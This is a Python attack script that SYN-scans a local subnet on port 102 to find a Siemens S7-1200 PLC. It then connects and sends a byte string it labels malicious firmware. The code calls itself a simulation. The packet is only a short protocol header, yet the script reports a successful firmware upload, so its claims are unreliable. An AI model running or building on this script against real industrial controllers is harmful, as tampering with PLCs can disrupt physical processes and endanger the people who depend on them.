from scapy.all import *
import socket
import os

# Function to scan the network for the Siemens S7-1200 PLC
def find_siemens_plc():
    print("[*] Scanning local network for Siemens PLC...")
    
    # Broadcast a SYN scan on port 102 to identify devices running Siemens S7Comm
    ip_range = "192.168.1.0/24"  # Adjust this based on your network
    ans, _ = sr(IP(dst=ip_range)/TCP(dport=102, flags="S"), timeout=2, verbose=0)
    
    # Extract and return responsive IP addresses
    for snd, rcv in ans:
        if rcv.haslayer(TCP) and rcv[TCP].flags == 18:  # SYN-ACK received
            print(f"[+] Possible Siemens PLC found at: {rcv[IP].src}")
            return rcv[IP].src
    
    print("[-] No Siemens PLC found on the network.")
    return None

# Function to upload malicious firmware (simulation)
def upload_malicious_firmware(plc_ip):
    print(f"[*] Connecting to Siemens PLC Ethernet module at {plc_ip}...")

    # Fake representation of sending rogue firmware using TCP socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((plc_ip, 102))  # Siemens S7comm Port
        print("[*] Connection established with PLC.")

        # Example: Send a rogue S7comm packet (normally should contain firmware data)
        malicious_firmware_payload = b"\x03\x00\x00\x16\x11\xE0\x00\x00\x00\x01\x00\xC1\x02\x03\xC2\x02\x02\xC0\x01\x0A"  # Sample S7comm packet
        s.send(malicious_firmware_payload)
        print("[+] Malicious firmware uploaded successfully (simulation).")
        
        s.close()
    except Exception as e:
        print(f"[-] Failed to upload firmware: {e}")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_siemens_plc()  # Discover the Siemens PLC
    if plc_ip:
        upload_malicious_firmware(plc_ip)  # Proceed with firmware modification